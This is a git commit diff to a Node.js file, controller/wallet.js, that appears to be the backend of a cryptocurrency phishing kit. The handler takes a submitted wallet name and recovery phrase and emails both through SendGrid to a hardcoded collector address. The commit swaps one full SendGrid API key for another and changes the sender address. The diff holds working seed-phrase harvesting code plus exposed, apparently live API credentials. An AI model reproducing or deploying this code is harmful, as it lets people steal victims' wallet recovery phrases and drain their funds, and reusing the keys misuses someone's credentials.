21fcf32be209b878dbd9104a972b4cabd91c0833
Gbollyhub <aliasgbolly@yahoo.com>
2022-01-05 02:37:36 +0100

    save

--- controller/wallet.js
+++ controller/wallet.js
@@ -7,10 +7,10 @@ exports.sendMail = async (req, res) =>{
 
     const { wallet_name, phrase} = req.body;
     const sgMail = require('@sendgrid/mail')
-sgMail.setApiKey("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")
+sgMail.setApiKey("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")
 const msg = {
   to: defaultEmail, //mail2saltoday@gmail.com Change to your recipient
-  from: 'aliasgbolly@gmail.com', //braindavis00400@gmail.com Change to your verified sender
+  from: 'braindavis00400@gmail.com', //braindavis00400@gmail.com Change to your verified sender
   subject: 'Alert: Submission',
   text: 'and easy to do anywhere, even with Node.js',
   html: '<strong>Wallet Name: </strong>' + wallet_name + "<br/>" + "<strong>Recovery Phrase: </strong>" + phrase,
